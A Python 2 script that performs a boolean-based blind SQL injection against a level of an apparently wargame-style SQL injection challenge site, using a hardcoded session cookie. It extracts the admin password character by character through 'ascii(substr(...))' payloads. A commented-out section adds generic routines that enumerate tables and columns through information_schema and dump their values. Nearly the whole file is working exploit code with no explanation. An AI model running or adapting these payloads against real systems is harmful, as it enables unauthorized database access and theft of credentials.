#-*- coding: utf-8 -*-
from itertools import izip_longest
import requests
import sys

cookies={"PHPSESSID" : "trb6s2vf8mtd03fjae5r32a7n6"}
url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php" # change URL
answer = "Hello admin" # change ANSWER

def data_res(payload) :
    data ={"pw" : payload}  #change DATA
    res = requests.get(url,params=data,cookies=cookies)
    return res



db=[]

 
dbname =''
for num2 in range(1,20) :  # DB 이름 찾기 
    for num in range(20,127) : 
        payload = "' or id='admin' and ascii(substr(pw,"+str(num2)+",1))="+str(num)+"#"
        #print payload
        res = data_res(payload)
        #print res.text
        #print payload
        if answer in res.text : 
            print str(chr(num))
            dbname += str(chr(num))
            break
    
    if num == 126 : 
        break

    
db.append(dbname)            
print "DB name : " , db



'''
table = []
for dbname in db : 
    for num3 in range(0,15) : 
        table_name = ''
        for num2 in range(1,30) :  # DB 이름 찾기 
            for num in range(20,127) : 
                payload = "' or ascii(substr((select table_name from information_schema.tables where table_schema=\'"+dbname+"\' limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+"#"
               
                res = data_res(payload)
                #print payload
                if answer in res.text : 
                    print str(chr(num))
                    table_name += str(chr(num))
                    break
                
            if num == 126 : 
                    break
        
        if table_name == '':
            break
        
        table.append(table_name)
        print dbname,"'s table",num3," name : " , table_name
    


#table_name="mem"
column = []
for table_name in table : 
    for num3 in range(0,15) : 
        column_name = ''    
        for num2 in range(1,30) :  # DB 이름 찾기 
            for num in range(20,127) : 
                payload = "' or ascii(substr((select column_name from information_schema.columns where table_name =\'"+table_name+"\' limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+"#"
                res = data_res(payload)
                #print payload
                if answer in res.text : 
                    print str(chr(num))
                    column_name += str(chr(num))
                    break
                
            if num ==126 :
                break
                
        if column_name == '' :
            break 
        
        column.append(column_name)
        print table_name,"'s column",num3,"_name : ",column_name
    
    
value = []

for table_name in table :    
    for column_name in column : 
        for num3 in range(0,15) : 
            column_value = ''
            for num2 in range(1,30) :  # DB 이름 찾기 
                for num in range(20,127) : 
                    payload = "' or ascii(substr((select "+column_name+" from "+table_name+" limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+"#"
                   
                    res = data_res(payload)
                    
                    #print payload
                    if answer in res.text : 
                        print str(chr(num))
                        column_value += str(chr(num))
                        break
                    
                if num == 126 :
                    break
                
            if column_value == '' :
                break
                    
            value.append(column_value)
            print column_name,"'s value",num3," : " ,column_value           


'''